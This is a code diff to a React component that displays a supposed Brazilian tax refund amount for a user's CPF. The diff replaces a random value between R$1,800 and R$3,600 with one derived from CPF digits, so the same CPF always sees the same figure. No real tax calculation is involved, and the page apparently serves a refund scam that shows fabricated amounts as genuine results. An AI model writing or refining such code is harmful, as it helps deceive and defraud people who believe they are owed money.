@@ -118,19 +118,10 @@ export default function ResultadoCalculo() {
             const valorEmCentavos = Math.round(parseFloat(valorRestituicaoExistente.toString()) * 100);
             setValorRestituicao(valorEmCentavos);
           } else {
-            // Gerar um novo valor (entre R$ 1.800,00 e R$ 3.600,00)
-            const valorMinimo = 180000;
-            const valorMaximo = 360000;
-            const valorAleatorio = Math.floor(Math.random() * (valorMaximo - valorMinimo + 1)) + valorMinimo;
-            setValorRestituicao(valorAleatorio);
-            
-            // Atualizar o contexto global com esse valor
-            updateUserData({
-              valorRestituicao: valorAleatorio / 100
-            });
-            
-            // Salvar o valor no banco de dados para consultas futuras
+            // Ao invés de gerar um valor aleatório, vamos forçar o backend a gerar um valor determinístico
+            // Isso vai garantir que o mesmo CPF sempre receba o mesmo valor
             try {
+              // Primeiro, tentamos criar o valor no backend
               await fetch('/api/restituicao', {
                 method: 'POST',
                 headers: {
@@ -138,12 +129,41 @@ export default function ResultadoCalculo() {
                 },
                 body: JSON.stringify({
                   cpf: cpfLimpo,
-                  valor: valorAleatorio / 100 // Converter de centavos para real
+                  valor: 0 // O backend vai ignorar esse valor e gerar um determinístico baseado no CPF
                 }),
               });
-              console.log("Valor salvo no banco de dados com sucesso");
+              
+              // Depois, consultamos o valor que foi gerado
+              const response = await fetch(`/api/restituicao?cpf=${cpfLimpo}`);
+              const data = await response.json();
+              
+              if (data.encontrado && data.valorRestituicao) {
+                console.log("Valor gerado pelo backend:", data.valorRestituicao);
+                const valorEmCentavos = Math.round(parseFloat(data.valorRestituicao) * 100);
+                setValorRestituicao(valorEmCentavos);
+                
+                // Atualizar o contexto com o valor
+                updateUserData({
+                  valorRestituicao: data.valorRestituicao
+                });
+              } else {
+                throw new Error("Valor não foi gerado pelo backend");
+              }
             } catch (error) {
-              console.error("Erro ao salvar valor no banco de dados:", error);
+              console.error("Erro ao gerar valor determinístico:", error);
+              
+              // Em caso de falha, usamos um valor padrão calculado localmente baseado no CPF
+              // Isso garante que o mesmo CPF sempre terá o mesmo valor, mesmo que o banco falhe
+              const valorBase = 1800 + (parseInt(cpfLimpo.substring(0, 3)) % 1200);
+              const centavos = parseInt(cpfLimpo.substring(9, 11));
+              const valorCalculado = valorBase + (centavos / 100);
+              
+              setValorRestituicao(Math.round(valorCalculado * 100));
+              
+              // Atualizar o contexto com o valor
+              updateUserData({
+                valorRestituicao: valorCalculado
+              });
             }
           }
         }
